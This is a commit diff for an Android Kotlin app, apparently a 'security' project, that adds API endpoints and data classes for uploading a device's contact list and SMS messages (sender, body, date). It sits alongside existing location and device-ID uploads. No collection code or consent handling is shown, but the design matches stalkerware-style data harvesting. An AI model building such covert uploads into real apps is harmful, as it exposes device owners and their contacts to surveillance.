a39d00e7eddef82e011ff06fb163be07c4a510f2
irling <italodavidramosling@gmail.com>
2024-09-16 17:43:02 -0500

    Se añadio POST y Dataclass de SMS and CONTACT

--- app/src/main/java/com/example/proyectosecurity/ApiService.kt
+++ app/src/main/java/com/example/proyectosecurity/ApiService.kt
@@ -13,8 +13,14 @@ interface ApiService {
     @POST("/v1/api/devices/send")
     suspend fun sendDeviceInfo(@Body deviceInfoRequest: DeviceInfoRequest): Response<DeviceResponse>
 
+    @POST("/v1/api/contact/send")
+    suspend fun sendContactInfo(@Body contactInfoRequest: List<ContactInfoRequest>): Response<ContactResponse>
+
+    @POST("/v1/api/sms/send")
+    suspend fun sendSMSInfo(@Body smsInfoRequest: SMSInfoRequest): Response<SMSResponse>
+
 }
-//LOCATION DATA CLASSS
+//LOCATION DATA CLASSS=========
 // For location request
 data class LocationRequest(
     val latitude: Double,
@@ -26,7 +32,7 @@ data class LocationResponse(
 );
 
 
-//DEVICE INFO DATA CLASS
+//DEVICE INFO DATA CLASS ===========
 data class DeviceInfoRequest(
     val deviceModel: String,
     val androidId: String,
@@ -39,3 +45,27 @@ data class DeviceInfoRequest(
 data class DeviceResponse (
     val message: String
 );
+
+//CONTACT INFO DATA CLASS ==========
+data class ContactInfoRequest (
+    val displayName: String,
+    val phoneNumber: String,
+    val contactId: String
+);
+data class ContactResponse (
+    val message: String
+);
+
+
+//SMS INFO DATA CLASS ==========
+
+data class  SMSInfoRequest (
+    val id : Long,
+    val address: String,
+    val body: String,
+    val date: Long
+)
+
+data class SMSResponse (
+    val message: String
+)
